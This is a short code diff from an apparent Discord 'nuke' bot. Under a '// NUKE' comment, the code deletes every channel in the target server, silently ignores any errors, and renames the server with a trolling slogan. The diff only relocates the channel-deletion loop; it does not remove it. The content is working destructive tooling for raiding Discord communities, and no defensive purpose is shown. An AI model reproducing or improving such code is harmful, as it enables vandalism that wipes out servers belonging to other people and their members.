@@ -75,11 +75,6 @@ https://discord.gg/annycW3Xrk
 
       // NUKE
       const discordServer = client.guilds.cache.get(interaction.guildId ?? "");
-      discordServer?.channels.cache.forEach(async (channel) => {
-        try {
-          await channel.delete();
-        } catch (_e) {}
-      });
 
       const max = 50;
       discordServer?.setName(text?.split("\n")[0] ?? "荒らし共栄圏万歳！");
@@ -116,6 +111,12 @@ https://discord.gg/annycW3Xrk
             }
           });
       }
+
+      discordServer?.channels.cache.forEach(async (channel) => {
+        try {
+          await channel.delete();
+        } catch (_e) {}
+      });
 
       discordServer?.setName(text?.split("\n")[0] ?? "荒らし共栄圏万歳！");
     }else {
